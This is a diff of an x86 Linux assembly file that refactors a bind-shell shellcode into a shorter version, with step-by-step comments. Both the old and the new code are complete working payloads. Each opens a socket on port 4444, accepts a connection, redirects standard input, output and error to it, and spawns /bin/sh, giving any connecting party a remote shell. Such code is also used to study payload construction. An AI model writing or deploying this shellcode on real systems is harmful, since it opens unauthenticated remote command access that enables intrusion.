@@ -3,85 +3,85 @@ global _start
 section .text
 _start:
 
-        xor eax,eax             ; we don't know what's in EAX
-        xor ebx,ebx                     ; or ebx...
-        ; socket(AF_INET, SOCK_STREAM, 0)
-        push eax                        ; last arg first, push 0 onto the stack
-        mov al,0x66             ; value for socketcall (102)
-        mov bl,0x1                      ; value for socket() syscall
-        push ebx                        ; second argument to call SOCK_STREAM
-        push 0x2                        ; third argument to call AF_INET
-        mov ecx,esp             ; the stack pointer is currently pointing to our argument list
-        int 0x80                        ; punch it
-        mov edx, eax            ; EDX is going to store our socket file descriptor
+ xor ebx,ebx           ; clear ebx
+ mul ebx               ; as well as eax and edx
 
-        ; bind(sockfd, (struct sockaddr *)&serverSA, sizeof(serverSA));
-        inc bl                          ; increment bl to 2 to use in our structure
-        xor eax,eax                     ; clear eax
-        push eax                        ;
-        push eax                        ; These 16 bytes of zeroes corresponds with sin_zero in sockaddr_in
-        push eax                        ; This is is the sin_addr location of sockaddr_in, all zeroes is INADDR_ANY
-        push word 0x5c11        ; This corresponds to sin_port, it has to be in big endian. port = 4444
-        push word bx            ; This corresponds with sin_family, 0x2 is AF_INET
-        mov esi,esp                     ; keep track of our sockaddr_in structure on the stack with esi
-        mov al,0x66                     ; setup the socketcall syscall, ebx is set to 0x2 from earlier which matches bind
-        push 0x10                       ; size of sockaddr_in (16)
-        push esi                        ; address of our sockaddr_in structure
-        push edx                        ; push our socket file descriptor
-        mov ecx,esp                     ; stack pointer pointing to our arg list
-        int 0x80                        ; make the call
+ ; socket(AF_INET, SOCK_STREAM, 0)
+ push eax              ; last arg first, push 0 onto the stack
+ mov al,0x66           ; value for socketcall (102)
+ mov bl,0x1            ; value for SYS_SOCKET syscall
+ push ebx              ; second argument to call SOCK_STREAM
+ push 0x2              ; third argument to call AF_INET
+ mov ecx,esp           ; the stack pointer to the list
+ int 0x80              ; punch it
+ push edx              ; Setup for the next syscall,
+ mov edx, eax          ; EDX is going to store our socket file descriptor
 
-        ;  listen(sockfd, 2);
-        xor eax,eax             ; clear eax
-        mov al,0x66                     ; setup socketcall
-        mov bl,0x4                      ; 0x4 = listen
-        push 0x2                        ; our queue is 2 long
-        push edx                        ; our file descriptor
-        mov ecx,esp                     ; argument list
-        int 0x80                        ; make the call
+; populate the sockaddr_in structure with our settings
+ inc bl                ; increment bl to 2 to use in our structure
+ push word 0x5c11      ; sin_port, it has to be in big endian. port = 4444
+ push word bx          ; sin_family, 0x2 is AF_INET
+ mov esi,esp           ; save the location of sockaddr in esi for later
 
-        ;newsockfd = accept(sockfd, (struct sockaddr *)&clientSA, &clientSaSize);
-        xor eax,eax                     ; clear eax
-        mov al,0x66                     ; setup socketcall
-        mov bl,0x5                      ; 0x5 = accept
-        push 0x10                       ; size of sockaddr is 16 bytes
-        push esp                        ; accept requires the address of the sizeof sockaddr, which ESP is currently pointing to
-        push esi                        ; push our old sockaddr_in location to be overwritten, the stack is a mess anyway.
-        push edx                        ; our file descriptor
-        mov ecx,esp                     ; our argument list
-        int 0x80                        ; make the call
-        mov edx,eax                     ; copy our new client socket to edx
+; bind(sockfd, (struct sockaddr *)&serverSA, sizeof(serverSA));
+;setup the stack as our argument list to bind
+ push 0x10             ; 1st argument: size of struct sockaddr (16)
+ push esi              ; 2nd argument: address of our sockaddr_in structure
+ push edx              ; 3rd argument: our socket descriptor
+ mov ecx,esp           ; stack pointer pointing to our arg list
+ mov al,0x66           ; socketcall number
+ ; ebx is set to 0x2 from earlier which matches SYS_BIND
+ int 0x80              ; make the call
 
-        ;dup2(newsockfd, 0);
-        xor eax,eax                     ; clear eax
-        mov al,0x3f                     ; dup2 syscall = 63
-        mov ebx,edx                     ; redirect to our client socket
-        xor ecx,ecx                     ; clear ecx, 0 is STDIN
-        int 0x80                        ; call it
+; listen(sockfd, 2);
+;setup the stack as our argument list to listen
+ push 0x1              ; 1st argument: queue length
+ push edx              ; 2nd argument: socket descriptor
+ mov ecx,esp           ; stack pointer pointing to our arg list
+ mov bl,0x4            ; SYS_LISTEN
+ mov al,0x66           ; setup socketcall
+ int 0x80              ; make the call
 
-        ;dup2(newsockfd, 1);
-        xor eax,eax                     ; clear eax
-        mov al,0x3f                     ; dup2 syscall = 63
-        mov ebx,edx                     ; redirect to our client socket
-        inc cl                          ; ecx = 1, which is STDOUT
-        int 0x80                        ; call it
+;newsockfd = accept(sockfd, (struct sockaddr *)&clientSA, &clientSaSize);
+;setup the stack as our argument list to accept
+ push 0x10                  ; size of sockaddr is 16 bytes
+; accept requires a pointer (not the size itself) to an int containing
+; the size of a struct sockaddr, currently ESP is pointing to this
+ push esp 
+; push our old sockaddr_in to be overwritten
+ push esi 
+ push edx                   ; our socket descriptor
+ mov ecx,esp                ; our argument list
+ mov al,0x66                ; setup socketcall
+ mov bl,0x5                 ; 0x5 = accept
+ int 0x80                   ; make the call
+ mov ebx,eax                ; copy our new client socket to edx
 
-        ;dup2(newsockfd, 2);
-        xor eax,eax                     ; clear eax
-        mov al,0x3f                     ; dup2 syscall = 63
-        mov ebx,edx                     ; redirect to our client socket
-        inc cl                          ; ecx = 2, which is STDERR
-        int 0x80                        ; call it
+; This section loops through dup2 for STDIN,STDOUT and STDERR 
+; redirecting them to our client socket
+ push 0x2                   ; setup the loop to start at 2
+ pop ecx                    ; this needs to be stored in ecx
+ ;dup2(newsockfd, 0);
+dup_loop:
+ mov al,0x3f                ; dup2 syscall = 63 
+ ; ebx is set to our client socket descriptor
+ int 0x80                   ; call it
+ dec ecx                    ; decrement ecx
+ jns dup_loop               ; keep going until ecx is -1 
 
-        ;execve(arg_list[0], arg_list, arg_list[1]);
-        xor eax,eax
-        push eax
-        push 0x68732f2f
-        push 0x6e69622f
-        mov ebx, esp
-        push eax
-        mov edx, [esp]
-        push esp
-        lea ecx, [esp + 4]
-        mov al,0xb
-        int 0x80
+;and finally make an execve call to fire off a new /bin/sh instance
+;execve(arg_list[0], arg_list, NULL);
+ xor edx,edx                ; clear edx
+ push edx                   ; null terminate our string
+ push 0x68732f2f            ; hs//
+ push 0x6e69622f            ; nib/
+ mov ebx, esp               ; save the address of our string (1st argument)
+ push edx                   ; push a null onto the stack
+ push ebx                   ; push the address of our string
+; the stack now looks like [&string][null][string][null]
+; the address of esp is the equivilent of a pointer to an null terminiated
+; array of strings 
+ lea ecx, [esp]             ; arg_list (2nd argument)
+; edx is set to NULL (3rd argument)
+ mov al,0xb                 ; 11 = execve
+ int 0x80                   ; call it
